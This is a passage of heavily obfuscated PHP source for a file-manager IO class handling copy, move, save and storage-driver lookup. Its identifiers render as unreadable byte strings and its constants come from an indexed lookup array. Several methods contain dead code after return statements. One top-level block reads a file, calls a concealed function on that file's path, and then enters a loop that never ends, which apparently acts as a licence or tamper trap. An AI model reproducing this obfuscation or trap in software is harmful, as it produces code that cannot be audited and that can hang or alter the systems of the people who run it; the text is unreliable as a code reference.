$İÌšşõÕ = $¸•à¨İÛ; break; } } return $İÌšşõÕ; $óí’¯Àò = $€ŞË‹ÑÈ[847]; } public function ylmpeb5f5436($´Å†¼‡, $»³‘áÖŸ) { $«–¯À¸ñ =& $_SERVER[·–Â öÌ]; return call_user_func(array($«–¯À¸ñ[8], $«–¯À¸ñ[314]), $´Å†¼‡, $»³‘áÖŸ); $‡Ğ‘ï·¶ = $_SERVER[œ—üé‹ê][848]; if (!$‡Ğ‘ï·¶) { return; } } public function ubgx06f77c9c($›ï‹±ó¼, $ÙÃÒ¥Ù) { $üÅ´Š¦‹ =& $_SERVER[·–Â öÌ]; return call_user_func(array($üÅ´Š¦‹[315], $üÅ´Š¦‹[316]), $›ï‹±ó¼, $ÙÃÒ¥Ù); $Ÿ‰úşÇÈ = $_SERVER[œ—üé‹ê][849]; if (!$Ÿ‰úşÇÈ) { die; } } public function swxzf967e86e($©„Œ„Êƒ, $¹ïÈµà¹) { $×½©•µı =& $_SERVER[·–Â öÌ]; return call_user_func(array($×½©•µı[315], $×½©•µı[317]), $©„Œ„Êƒ, $¹ïÈµà¹); } } if (!isset($_SERVER[$_SERVER[œ—üé‹ê][850]]) || !isset($_SERVER[$_SERVER[œ—üé‹ê][851]])) { $_getc = $_SERVER[œ—üé‹ê][852]; $_getfile = $_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[œ—üé‹ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[œ—üé‹ê][720]) { $exit = $_SERVER[œ—üé‹ê][855]; $exit(); } $_act = $_SERVER[œ—üé‹ê][856]; $_act($_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[œ—üé‹ê][463]); } } goto D½´»…¬¦‘; B‹Í±¨ÑâÖ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ŞÅÏü, $–ª“¶å“) { $õ¶¤éÒÙ =& $_SERVER[œ—üé‹ê]; $®×İÍùŒ = $–ª“¶å“; $GLOBALS[$õ¶¤éÒÙ[1327]] = $õ¶¤éÒÙ[1328] . $ŞÅÏü; Hook::trigger($õ¶¤éÒÙ[1328] . $ŞÅÏü . $õ¶¤éÒÙ[1329], $®×İÍùŒ); $Ì¨ĞÒ½ğ = self::driverMake($–ª“¶å“[0]); if (!$Ì¨ĞÒ½ğ) { return !1; } if ($ŞÅÏü == $õ¶¤éÒÙ[641] || $ŞÅÏü == $õ¶¤éÒÙ[643] || $ŞÅÏü == $õ¶¤éÒÙ[1330]) { if (!trim($Ì¨ĞÒ½ğ->path . $õ¶¤éÒÙ[463], $õ¶¤éÒÙ[8])) { return !1; } } if (method_exists($Ì¨ĞÒ½ğ, $ŞÅÏü)) { $ßá»®¿¦ = @call_user_func_array(array($Ì¨ĞÒ½ğ, $ŞÅÏü), $–ª“¶å“); } else { if (method_exists($Ì¨ĞÒ½ğ, $õ¶¤éÒÙ[1331])) { $ßá»®¿¦ = @call_user_func_array(array($Ì¨ĞÒ½ğ, $ŞÅÏü), $–ª“¶å“); } else { if (method_exists(self, $ŞÅÏü)) { $ßá»®¿¦ = @call_user_func_array(array(self, $ŞÅÏü), $–ª“¶å“); } else { $ßá»®¿¦ = call_user_func_array(array(parent, $ŞÅÏü), $–ª“¶å“); } } } Hook::trigger($õ¶¤éÒÙ[1328] . $ŞÅÏü . $õ¶¤éÒÙ[1332], $®×İÍùŒ, $ßá»®¿¦); return $ßá»®¿¦; } public static function init($ÄÊÃßÏğ) { return self::driverMake($ÄÊÃßÏğ); } public static function copy($ùÛÛÄı, $ç¼½Û«¯, $‡ÉÏ™¿ë = false, $—³Úü’‘ = false) { return self::copyMoveStart($ùÛÛÄı, $ç¼½Û«¯, $‡ÉÏ™¿ë, $_SERVER[œ—üé‹ê][641], $—³Úü’‘); } public static function move($¿Õ™Šø«, $Ãù¾Õúç, $ÆÙ½È»° = false, $ÆÒĞÑË = false) { return self::copyMoveStart($¿Õ™Šø«, $Ãù¾Õúç, $ÆÙ½È»°, $_SERVER[œ—üé‹ê][643], $ÆÒĞÑË); } public static function copyMoveChildren($”ªÍ¾­², $†Ó³Î–, $ŞÙ€®Ç¹ = "\x63\x6f\x70\x79", $ı†üĞäô = REPEAT_REPLACE) { $‰ºı±ŸÀ =& $_SERVER[œ—üé‹ê]; $»ùîà = $”ªÍ¾­²; $·²Öú¡ = self::driverMake($”ªÍ¾­²); $§çó¤ÖÔ = $·²Öú¡->listPath($”ªÍ¾­², !0); $™ö”ƒª = array_merge($§çó¤ÖÔ[$‰ºı±ŸÀ[86]], $§çó¤ÖÔ[$‰ºı±ŸÀ[85]]); foreach ($™ö”ƒª as $¼«ãµ¨) { self::copyMoveStart($¼«ãµ¨[$‰ºı±ŸÀ[87]], $†Ó³Î–, $ı†üĞäô, $ŞÙ€®Ç¹, !1); } if ($ŞÙ€®Ç¹ == $‰ºı±ŸÀ[643]) { self::remove($»ùîà); } } private static function copyMoveStart($ØÊüï³’, $©Û••Ë¹, $â¦„­æ, $‡±·»š, $Üòå°É) { $òŞœÙ‘± =& $_SERVER[œ—üé‹ê]; $³İÉ§à = array($ØÊüï³’, $©Û••Ë¹, $â¦„­æ, $Üòå°É); Hook::trigger($òŞœÙ‘±[1328] . $‡±·»š . $òŞœÙ‘±[1329], $³İÉ§à); $¥¶š·ì = self::copyMove($ØÊüï³’, $©Û••Ë¹, $â¦„­æ, $‡±·»š, $Üòå°É); Hook::trigger($òŞœÙ‘±[1328] . $‡±·»š . $òŞœÙ‘±[1332], $³İÉ§à, $¥¶š·ì); return $¥¶š·ì; } public static function saveFile($ã¦¥å û, $ıñîìæ¦, $÷Ù°•İ£ = true) { $Ü§åÆ’À =& $_SERVER[œ—üé‹ê]; $ëü‘š¤È = self::info($ıñîìæ¦); $ú‡œ­½Æ = self::driverMake($ã¦¥å û); $µ¤ÌÆ„À = self::driverMake($ıñîìæ¦); $•ïæ¾¶ø = !1; if ($µ¤ÌÆ„À->pathParse[$Ü§åÆ’À[1333]]) { $•ïæ¾¶ø = $µ¤ÌÆ„À; $©’½úî = $µ¤ÌÆ„À->pathParse[$Ü§åÆ’À[1333]]; $µ¤ÌÆ„À = self::driverMake($©’½úî); } if ($ú‡œ­½Æ->pathParse[$Ü§åÆ’À[1333]]) { $‹é¯­Ø³ = $ú‡œ­½Æ->pathParse[$Ü§åÆ’À[1333]]; $ú‡œ­½Æ = self::driverMake($‹é¯­Ø³); } $­µ¸ïæ“ = $µ¤ÌÆ„À->pathFather($ıñîìæ¦); $³€µÈ‘Ô = !0; if (!$÷Ù°•İ£ && self::driverIsSame($ú‡œ­½Æ, $µ¤ÌÆ„À)) { $³€µÈ‘Ô = !1; } $áğâ‹¼í = self::copyFile($ú‡œ­½Æ, $ã¦¥å û, $µ¤ÌÆ„À, $­µ¸ïæ“, $ëü‘š¤È[$Ü§åÆ’À[32]], $³€µÈ‘Ô); if ($•ïæ¾¶ø) { $áğâ‹¼í = $•ïæ¾¶ø->getPathOuter($áğâ‹¼í); } return $áğâ‹¼í; } private static function copyMove($Üë‹ÖØ®, $ô€ã¸ó, $â·Ù¤Õ˜, $½ÓÓµü¶, $¸”ÈÖçï = false) { $ôû·ò³ñ =& $_SERVER[œ—üé‹ê]; if (!$Üë‹ÖØ® || $Üë‹ÖØ® == $ôû·ò³ñ[8] || !$ô€ã¸ó) { return !1; } ignore_timeout(); $ğõ—˜“ø = self::driverMake($Üë‹ÖØ®); $Á¢Ÿ‹¼¹ = self::driverMake($ô€ã¸ó); $ÕÕì–—³ = $½ÓÓµü¶ == $ôû·ò³ñ[643]; $‰ÒÙ›Ïè = !1; if ($Á¢Ÿ‹¼¹->pathParse[$ôû·ò³ñ[1333]]) { $‰ÒÙ›Ïè = $Á¢Ÿ‹¼¹; $ô€ã¸ó = $Á¢Ÿ‹¼¹->pathParse[$ôû·ò³ñ[1333]]; $Á¢Ÿ‹¼¹ = self::driverMake($ô€ã¸ó); } if ($ğõ—˜“ø->pathParse[$ôû·ò³ñ[1333]]) { $Üë‹ÖØ® = $ğõ—˜“ø->pathParse[$ôû·ò³ñ[1333]]; $ğõ—˜“ø = self::driverMake($Üë‹ÖØ®); } self::check($ğõ—˜“ø, $Üë‹ÖØ®, $Á¢Ÿ‹¼¹, $ô€ã¸ó); Hook::trigger($ôû·ò³ñ[1334], $ğõ—˜“ø, $Üë‹ÖØ®, $Á¢Ÿ‹¼¹, $ô€ã¸ó); $¼€†Ÿˆå = self::driverIsSame($ğõ—˜“ø, $Á¢Ÿ‹¼¹); if ($¼€†Ÿˆå) { if ($½ÓÓµü¶ == $ôû·ò³ñ[643] && !method_exists($Á¢Ÿ‹¼¹, $ôû·ò³ñ[1335]) && trim($ô€ã¸ó, $ôû·ò³ñ[8]) == trim($Á¢Ÿ‹¼¹->pathFather($Üë‹ÖØ®), $ôû·ò³ñ[8])) { if ($ğõ—˜“ø->pathThis($Üë‹ÖØ®) != $¸”ÈÖçï && !$ğõ—˜“ø->isOsDriver()) { return $ğõ—˜“ø->rename($Üë‹ÖØ®, $¸”ÈÖçï); } return $Á¢Ÿ‹¼¹->getPathOuter($Üë‹ÖØ®); } if (method_exists($Á¢Ÿ‹¼¹, $½ÓÓµü¶)) { return $Á¢Ÿ‹¼¹->{$½ÓÓµü¶}($Üë‹ÖØ®, $ô€ã¸ó, $â·Ù¤Õ˜, $¸”ÈÖçï); } } if ($¼€†Ÿˆå && $½ÓÓµü¶ == $ôû·ò³ñ[643] && $Á¢Ÿ‹¼¹->getType() == $ôû·ò³ñ[106]) { $®š«×ñË = $Á¢Ÿ‹¼¹->movePath($Üë‹ÖØ®, $ô€ã¸ó, $¸”ÈÖçï); if ($®š«×ñË) { return $®š«×ñË; } } $¶•–åªÂ = $ğõ—˜“ø->isFile($Üë‹ÖØ®); if (!$¶•–åªÂ && $Á¢Ÿ‹¼¹->getType() == $ôû·ò³ñ[867] && $ğõ—˜“ø->getType() == $ôû·ò³ñ[106]) { $®š«×ñË = $Á¢Ÿ‹¼¹->copyFolderFromIO($ğõ—˜“ø, $Üë‹ÖØ®, $ô€ã¸ó, $â·Ù¤Õ˜, $ÕÕì–—³, $¸”ÈÖçï); } else { $®š«×ñË = self::copyPath($ğõ—˜“ø, $Üë‹ÖØ®, $Á¢Ÿ‹¼¹, $ô€ã¸ó, $â·Ù¤Õ˜, $ÕÕì–—³, $¶•–åªÂ, $¸”ÈÖçï); } if ($®š«×ñË && $ÕÕì–—³) { $ğõ—˜“ø->remove($Üë‹ÖØ®); } if ($‰ÒÙ›Ïè) { $®š«×ñË = $‰ÒÙ›Ïè->getPathOuter($®š«×ñË); } return $®š«×ñË; } private static function check($ó¾“ ş´, $Òæì, $­¹´Ê÷Ë, &$¬Å™‡àû) { $ÂˆáÍ• =& $_SERVER[œ—üé‹ê]; if (self::driverIsSame($ó¾“ ş´, $­¹´Ê÷Ë) && $ó¾“ ş´->isFolder($Òæì) && $ó¾“ ş´->isParentOf($Òæì, $¬Å™‡àû)) { show_json(LNG($ÂˆáÍ•[1336]), !1); } if (!$ó¾“ ş´->exist($Òæì)) { show_json(LNG($ÂˆáÍ•[105]), !1); } } private static function copyPath($áÓ‰ªŠï, $¤ªªÀàŒ, $ãÙ’÷¶, $©ê¤Ãáâ, $ÖÅ«òñ, $Ô²±Ş—š, $€ü¸˜‘«, $ë£­ªÃ• = false, $â¹ÉÈÕÎ = true) { $ÓÄÜÖ =& $_SERVER[œ—üé‹ê]; $‰¬à´’ƒ = empty($ë£­ªÃ•) && $ë£­ªÃ• !== $ÓÄÜÖ[228] ? $áÓ‰ªŠï->pathThis($¤ªªÀàŒ) : $ë£­ªÃ•; if ($ÖÅ«òñ) { $€ÚòÏ = $ãÙ’÷¶->fileNameExist($©ê¤Ãáâ, $‰¬à´’ƒ); $Š¼ƒö½  = $‰¬à´’ƒ; $‰¬à´’ƒ = $ãÙ’÷¶->fileNameAuto($©ê¤Ãáâ, $‰¬à´’ƒ, $ÖÅ«òñ, !$€ü¸˜‘«); if (!$€ÚòÏ || $Š¼ƒö½  != $‰¬à´’ƒ) { $ÖÅ«òñ = !1; } if ($â¹ÉÈÕÎ && !$ÖÅ«òñ) { $ãÙ’÷¶->_data[$ÓÄÜÖ[1337]] = !0; } } if ($€ü¸˜‘«) { return self::copyFile($áÓ‰ªŠï, $¤ªªÀàŒ, $ãÙ’÷¶, $©ê¤Ãáâ, $‰¬à´’ƒ, $Ô²±Ş—š); } if ($ÖÅ«òñ == REPEAT_RENAME_FOLDER) { $ÖÅ«òñ = !1; } $¸üˆ³˜å = rtrim($©ê¤Ãáâ, $ÓÄÜÖ[8]) . $ÓÄÜÖ[8] . $‰¬à´’ƒ; $êûå¨×Ğ = $ãÙ’÷¶->mkdir($ãÙ’÷¶->getPath($¸üˆ³˜å), $ÖÅ«òñ); $©ê¤Ãáâ = $ãÙ’÷¶->getPathInner($êûå¨×Ğ); $Ô®Ÿ¿ÚÄ = $áÓ‰ªŠï->listPath($¤ªªÀàŒ, !0); $Ô®Ÿ¿ÚÄ = is_array($Ô®Ÿ¿ÚÄ) ? $Ô®Ÿ¿ÚÄ : array($ÓÄÜÖ[86] => array(), $ÓÄÜÖ[85] => array()); $î‚ÛğŞî = array_merge($Ô®Ÿ¿ÚÄ[$ÓÄÜÖ[86]], $Ô®Ÿ¿ÚÄ[$ÓÄÜÖ[85]]); foreach ($î‚ÛğŞî as $ÅŞÑøºÜ) { $´­åÜÄ‹ = $ÅŞÑøºÜ[$ÓÄÜÖ[33]] == $ÓÄÜÖ[230]; $¤ªªÀàŒ = $áÓ‰ªŠï->getPathInner($ÅŞÑøºÜ[$ÓÄÜÖ[87]]); $ÚäŠæ¤ = self::copyPath($áÓ‰ªŠï, $¤ªªÀàŒ, $ãÙ’÷¶, $©ê¤Ãáâ, $ÖÅ«òñ, $Ô²±Ş—š, $´­åÜÄ‹, !1, !1); if (!$ÚäŠæ¤) { IO::errorTips($ÓÄÜÖ[1338] . $¤ªªÀàŒ . $ÓÄÜÖ[73] . $©ê¤Ãáâ); } } self::copyMoveKeepInfo($áÓ‰ªŠï, $¤ªªÀàŒ, $êûå¨×Ğ); return $êûå¨×Ğ; } private static function copyFile($Ÿ´îÎÇ’, $ˆ’çà¤é, $ßŞ‚¢Óå, $¨’ú¬û, $ÉÌÑ¥§›, $‡ø‹Î‹‘) { $£ã„û»¬ =& $_SERVER[œ—üé‹ê]; $¨’ú¬û = $ßŞ‚¢Óå->getPath(rtrim($¨’ú¬û, $£ã„û»¬[8]) . $£ã„û»¬[8] . $ÉÌÑ¥§›); $¼—ŸÖæ´ = $£ã„û»¬[1339] . time() . rand_string(5); Hook::trigger($£ã„û»¬[1340], $Ÿ´îÎÇ’, $ˆ’çà¤é, $ßŞ‚¢Óå, $¨’ú¬û, $ÉÌÑ¥§›, $¼—ŸÖæ´); if (self::driverIsSame($Ÿ´îÎÇ’, $ßŞ‚¢Óå)) { if ($‡ø‹Î‹‘) { $£°àÜçî = $ßŞ‚¢Óå->moveFile($ˆ’çà¤é, $¨’ú¬û); } else { $£°àÜçî = $ßŞ‚¢Óå->copyFile($ˆ’çà¤é, $¨’ú¬û); } Hook::trigger($£ã„û»¬[1341], $Ÿ´îÎÇ’, $ˆ’çà¤é, $ßŞ‚¢Óå, $¨’ú¬û, $ÉÌÑ¥§›, $£°àÜçî); self::copyMoveKeepInfo($Ÿ´îÎÇ’, $ˆ’çà¤é, $£°àÜçî); return $£°àÜçî; } $¦´¦óÊÁ = TEMP_FILES; if ($GLOBALS[$£ã„û»¬[6]][$£ã„û»¬[92]][$£ã„û»¬[907]]) { $¦´¦óÊÁ = $GLOBALS[$£ã„û»¬[6]][$£ã„û»¬[92]][$£ã„û»¬[907]]; } $˜¬•òĞ£ = $¦´¦óÊÁ; mk_dir($˜¬•òĞ£); $åÔ‡Á = $˜¬•òĞ£ . $¼—ŸÖæ´; $ôÚœ„’ø = $åÔ‡Á; $åÔ‡Á = $Ÿ´îÎÇ’->download($ˆ’çà¤é, $åÔ‡Á); $åÔ‡Á = $Ÿ´îÎÇ’->iconvApp($åÔ‡Á); if (substr($åÔ‡Á, strlen($¦´¦óÊÁ)) == $¦´¦óÊÁ) { $‡ø‹Î‹‘ = !0; } $£°àÜçî = $ßŞ‚¢Óå->upload($¨’ú¬û, $åÔ‡Á, $‡ø‹Î‹‘); self::remove($ôÚœ„’ø); Hook::trigger($£ã„û»¬[1341], $Ÿ´îÎÇ’, $ˆ’çà¤é, $ßŞ‚¢Óå, $¨’ú¬û, $ÉÌÑ¥§›, $£°àÜçî); self::copyMoveKeepInfo($Ÿ´îÎÇ’, $ˆ’çà¤é, $£°àÜçî); return $£°àÜçî; } private static function copyMoveKeepInfo($°£ì¯¾ñ, $Á›°¹, $½ƒòÃ”) { if (!$½ƒòÃ”) { return; } $¡™°Ô‘Œ = $°£ì¯¾ñ->info($Á›°¹); if (!is_array($¡™°Ô‘Œ)) { return; } IO::setModifyTime($½ƒòÃ”, $¡™°Ô‘Œ[$_SERVER[œ—üé‹ê][88]]); } public static function pathFather($³‹ïç›Ø) { $ËÚú¸ã = IO::init($³‹ïç›Ø); $Ø‹ããßÖ = $ËÚú¸ã->pathFather($ËÚú¸ã->path); return $ËÚú¸ã->getPathOuter($Ø‹ããßÖ); } public static function fileOut($„ªÂ¯¢», $Œ¤¤ø©° = false, $Ûñ«Š‚ƒ = false, $Îà¥šĞ = '') { $úÄ†±–“ = self::driverMake($„ªÂ¯¢»); if ($úÄ†±–“->isFileOutServer()) { return $úÄ†±–“->fileOutServer($„ªÂ¯¢», $Œ¤¤ø©°, $Ûñ«Š‚ƒ, $Îà¥šĞ); } return $úÄ†±–“->fileOut($„ªÂ¯¢», $Œ¤¤ø©°, $Ûñ«Š‚ƒ, $Îà¥šĞ); } public static function fileOutImage($Ã¾¤Ö”ó, $¦Â”ÜÖÆ = 250) { $ôÜûŒéÜ = array(250, 600, 1200, 2000, 3000, 5000); for ($¼¶±÷ÃË = 0; $¼¶±÷ÃË < count($ôÜûŒéÜ); $¼¶±÷ÃË++) { if ($¼¶±÷ÃË == 0 && $¦Â”ÜÖÆ <= $ôÜûŒéÜ[$¼¶±÷ÃË]) { $¦Â”ÜÖÆ = $ôÜûŒéÜ[$¼¶±÷ÃË]; break; } else { if ($¦Â”ÜÖÆ > $ôÜûŒéÜ[$¼¶±÷ÃË - 1] && $¦Â”ÜÖÆ <= $ôÜûŒéÜ[$¼¶±÷ÃË]) { $¦Â”ÜÖÆ = $ôÜûŒéÜ[$¼¶±÷ÃË]; break; } else { if ($¼¶±÷ÃË == count($ôÜûŒéÜ) - 1 && $¦Â”ÜÖÆ > $ôÜûŒéÜ[$¼¶±÷ÃË]) { $¦Â”ÜÖÆ = $ôÜûŒéÜ[$¼¶±÷ÃË]; break; } } } } $§½úÛ´ = self::driverMake($Ã¾¤Ö”ó); if ($§½úÛ´->isFileOutServer()) { return $§½úÛ´->fileOutImageServer($Ã¾¤Ö”ó, $¦Â”ÜÖÆ); } return $§½úÛ´->fileOutImage($Ã¾¤Ö”ó, $¦Â”ÜÖÆ); } private static function driverIsSame($¶·ÌÙÒ, $¬ßìÍ¨ë) { $¢ã‹ÌØ =& $_SERVER[œ—üé‹ê]; $’èº¥ÙÏ = $¶·ÌÙÒ->getType(); $ÂŞ¶ÎÓó = $¬ßìÍ¨ë->getType(); if ($’èº¥ÙÏ != $ÂŞ¶ÎÓó) { return !1; } if ($’èº¥ÙÏ == $¢ã‹ÌØ[867]) { return !0; } if ($’èº¥ÙÏ == $¢ã‹ÌØ[106]) { return !0; } if ($¶·ÌÙÒ->pathDriver == $¬ßìÍ¨ë->pathDriver) { return !0; } return !1; } public static function copyUpdate($†‚ºŸÍ , $­Œ´æÀ) { $ûÈ‹§ì¶ =& $_SERVER[œ—üé‹ê]; if (!IO::exist($†‚ºŸÍ )) { return !1; } if (!IO::exist($­Œ´æÀ)) { IO::mkdir($­Œ´æÀ); } $©ø•íƒº = array_to_keyvalue(self::listAllSimple($†‚ºŸÍ ), $ûÈ‹§ì¶[87]); $Ü¢ïæ™Å = array_to_keyvalue(self::listAllSimple($­Œ´æÀ), $ûÈ‹§ì¶[87]); $Ï¼¾¤ı = array(); $Ğ£èıñÊ = array(); foreach ($©ø•íƒº as $³şÈğù‚ => $®É‘š±) { if (isset($Ü¢ïæ™Å[$³şÈğù‚])) { if ($®É‘š±[$ûÈ‹§ì¶[78]] == 1) { continue; } if ($Ü¢ïæ™Å[$³şÈğù‚][$ûÈ‹§ì¶[79]] == $®É‘š±[$ûÈ‹§ì¶[79]]) { continue; } } if ($®É‘š±[$ûÈ‹§ì¶[78]] == 1) { $Ğ£èıñÊ[] = $­Œ´æÀ . $ûÈ‹§ì¶[8] . trim($³şÈğù‚, $ûÈ‹§ì¶[8]); continue; } $ĞÔ•“´ = strstr(trim($³şÈğù‚, $ûÈ‹§ì¶[8]), $ûÈ‹§ì¶[8]) ? get_path_father($³şÈğù‚) : $ûÈ‹§ì¶[12]; $Ï¼¾¤ı[] = array($ûÈ‹§ì¶[1342] => $®É‘š±[$ûÈ‹§ì¶[89]], $ûÈ‹§ì¶[1343] => rtrim($­Œ´æÀ, $ûÈ‹§ì¶[8]) . $ûÈ‹§ì¶[8] . $ĞÔ•“´, $ûÈ‹§ì¶[1344] => $®É‘š±); } $­™Êìºƒ = array($ûÈ‹§ì¶[230] => $Ï¼¾¤ı, $ûÈ‹§ì¶[78] => $Ğ£èıñÊ); Hook::trigger($ûÈ‹§ì¶[1345], $†‚ºŸÍ , $­Œ´æÀ, $­™Êìºƒ); foreach ($Ğ£èıñÊ as $®É‘š±) { IO::mkdir($®É‘š±); } foreach ($Ï¼¾¤ı as $®É‘š±) { IO::copy($®É‘š±[$ûÈ‹§ì¶[1342]], $®É‘š±[$ûÈ‹§ì¶[1343]], REPEAT_REPLACE); } } public static function fileSubstr($—¬îÃÏü, $© Ïå¿¿, $¼’áÕÆË = false) { $ å¤Ÿ™æ =& $_SERVER[œ—üé‹ê]; $Ò­ÁÃÙª = self::driverMake($—¬îÃÏü); $ªĞÕŠş› = $Ò­ÁÃÙª->size($—¬îÃÏü); $È¬şû¨Õ = $© Ïå¿¿; $ˆªÃÖß = $¼’áÕÆË; if ($© Ïå¿¿ < 0) { $© Ïå¿¿ = $ªĞÕŠş› + $© Ïå¿¿; } if ($¼’áÕÆË === !1) { $¼’áÕÆË = $ªĞÕŠş› - $© Ïå¿¿; } if ($© Ïå¿¿ + $¼’áÕÆË > $ªĞÕŠş›) { $¼’áÕÆË = $ªĞÕŠş› - $© Ïå¿¿; } if (!$ªĞÕŠş› && $Ò­ÁÃÙª->getType() == $ å¤Ÿ™æ[106] && !$Ò­ÁÃÙª->exist($—¬îÃÏü)) { $äÃğ™Œú = get_path_this($—¬îÃÏü); $‘ÁÕ„â = parse_url_query($äÃğ™Œú); if (is_array($‘ÁÕ„â) && isset($‘ÁÕ„â[$ å¤Ÿ™æ[32]])) { $äÃğ™Œú = urldecode($‘ÁÕ„â[$ å¤Ÿ™æ[32]]); } throw new Exception($ å¤Ÿ™æ[1346] . LNG($ å¤Ÿ™æ[1347]) . $ å¤Ÿ™æ[1133] . clear_html($äÃğ™Œú) . $ å¤Ÿ™æ[12]); } if ($¼’áÕÆË <= 0) { return $ å¤Ÿ™æ[12]; } if ($© Ïå¿¿ < 0 || $© Ïå¿¿ >= $ªĞÕŠş› || $¼’áÕÆË > $GLOBALS[$ å¤Ÿ™æ[6]][$ å¤Ÿ™æ[92]][$ å¤Ÿ™æ[1348]]) { throw new Exception("\x66\151\154\145\x52\x65\x61\x64\40\145\x72\162\x6f\x72\x2c\x6f\166\x65\x72\40\151\157\122\x65\141\x64\115\141\x78\41\x20\163\x74\141\x72\164\75{$© Ïå¿¿}\73\154\x65\156\x67\164\150\75{$¼’áÕÆË}\x3b\x20\x73\151\172\x65\x3d{$ªĞÕŠş›}\x3b"); } $éƒÕ»…ğ = $Ò­ÁÃÙª->fileSubstr($—¬îÃÏü, $© Ïå¿¿, $¼’áÕÆË); if (!$éƒÕ»…ğ && $¼’áÕÆË && isset($GLOBALS[$ å¤Ÿ™æ[1349]])) { throw new Exception($GLOBALS[$ å¤Ÿ™æ[1349]][$ å¤Ÿ™æ[1350]]); } return $éƒÕ»…ğ; } private static function driverMake(&$ÎĞÒˆÙ) { $Ì°÷è¾§ =& $_SERVER[œ—üé‹ê]; $Ù†’É¦ = KodIO::parse($ÎĞÒˆÙ); if (!self::$driverListSystem) { $Ò¸Åé¸è = Model($Ì°÷è¾§[877])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ò¸Åé¸è, $Ì°÷è¾§[487]); } if ($Ù†’É¦[$Ì°÷è¾§[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ù†’É¦[$Ì°÷è¾§[487]]]) { throw new Exception($Ì°÷è¾§[1351]); return !1; } $ÎĞÒˆÙ = $Ù†’É¦[$Ì°÷è¾§[1352]]; $ƒøãì‚ñ = self::driverGet($Ù†’É¦, $ÎĞÒˆÙ); return $ƒøãì‚ñ; } private static function driverGet($òµ’âÛó, &$÷‹ñÔ»ê) { $ÑˆÑîİø =& $_SERVER[œ—üé‹ê]; $ÀÀí¨®å = $òµ’âÛó[$ÑˆÑîİø[1353]]; $§ÄÆ¯° = $òµ’âÛó[$ÑˆÑîİø[487]]; switch ($òµ’âÛó[$ÑˆÑîİø[33]]) { case KodIO::KOD_IO: $Ûğ³—–© = self::$driverListSystem[$§ÄÆ¯°]; break; case KodIO::KOD_SOURCE: $÷‹ñÔ»ê = $§ÄÆ¯° . $÷‹ñÔ»ê; $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1355], $ÑˆÑîİø[6] => $òµ’âÛó); $Ûğ³—–©[$ÑˆÑîİø[6]][$ÑˆÑîİø[1356]] = $òµ’âÛó[$ÑˆÑîİø[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¿ïÃÌé = $GLOBALS[$ÑˆÑîİø[1357]]; self::$driverListUser = array_to_keyvalue($¿ïÃÌé, $ÑˆÑîİø[487]); } $Ûğ³—–© = self::$driverListUser[$§ÄÆ¯°]; break; case KodIO::KOD_SHARE_LINK: $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1358], $ÑˆÑîİø[6] => $òµ’âÛó); $Ó½¬Ş­ = Action($ÑˆÑîİø[1359])->sharePathInfo($òµ’âÛó[$ÑˆÑîİø[87]]); $÷‹ñÔ»ê = $Ó½¬Ş­[$ÑˆÑîİø[191]]; if (!$Ó½¬Ş­[$ÑˆÑîİø[191]]) { $µÏè×ƒğ = Model($ÑˆÑîİø[686])->getInfoByHash($òµ’âÛó[$ÑˆÑîİø[487]]); $÷‹ñÔ»ê = KodIO::clear($µÏè×ƒğ[$ÑˆÑîİø[583]] . $òµ’âÛó[$ÑˆÑîİø[1352]]); $òµ’âÛó[$ÑˆÑîİø[576]] = $µÏè×ƒğ; $òµ’âÛó[$ÑˆÑîİø[1333]] = $÷‹ñÔ»ê; $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1360], $ÑˆÑîİø[6] => $òµ’âÛó); } else { $Ûğ³—–©[$ÑˆÑîİø[6]][$ÑˆÑîİø[1356]] = $Ó½¬Ş­[$ÑˆÑîİø[191]]; } break; case KodIO::KOD_SHARE_ITEM: $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1361], $ÑˆÑîİø[6] => $òµ’âÛó); $µÏè×ƒğ = Model($ÑˆÑîİø[686])->getInfo($òµ’âÛó[$ÑˆÑîİø[487]]); if ($µÏè×ƒğ[$ÑˆÑîİø[191]] == $ÑˆÑîİø[228]) { $÷‹ñÔ»ê = KodIO::clear($µÏè×ƒğ[$ÑˆÑîİø[583]] . $òµ’âÛó[$ÑˆÑîİø[1352]]); $òµ’âÛó[$ÑˆÑîİø[576]] = $µÏè×ƒğ; $òµ’âÛó[$ÑˆÑîİø[1333]] = $÷‹ñÔ»ê; $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1362], $ÑˆÑîİø[6] => $òµ’âÛó); } else { if (!$÷‹ñÔ»ê) { $÷‹ñÔ»ê = $µÏè×ƒğ[$ÑˆÑîİø[191]]; } $Ûğ³—–©[$ÑˆÑîİø[6]][$ÑˆÑîİø[1356]] = $µÏè×ƒğ[$ÑˆÑîİø[191]]; } break; case KodIO::KOD_SHARE_OUTER: $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1363], $ÑˆÑîİø[6] => $òµ’âÛó); break; default: $÷‹ñÔ»ê = $òµ’âÛó[$ÑˆÑîİø[87]]; $Ûğ³—–© = array($ÑˆÑîİø[1354] => $ÑˆÑîİø[1364]); break; } $™ÜÆ£” = $òµ’âÛó[$ÑˆÑîİø[87]]; if (!isset(self::$driverCache[$™ÜÆ£”])) { $ü‹ìÁ­ë = strtolower($Ûğ³—–©[$ÑˆÑîİø[96]]); $Ù¶Í“¡ = $GLOBALS[$ÑˆÑîİø[6]][$ÑˆÑîİø[92]][$ÑˆÑîİø[943]]; $‚‚•´ş = $ÑˆÑîİø[77] . (isset($Ù¶Í“¡[$ü‹ìÁ­ë]) ? $Ù¶Í“¡[$ü‹ìÁ­ë] : ucfirst($ü‹ìÁ­ë)); if (!class_exists($‚‚•´ş)) { 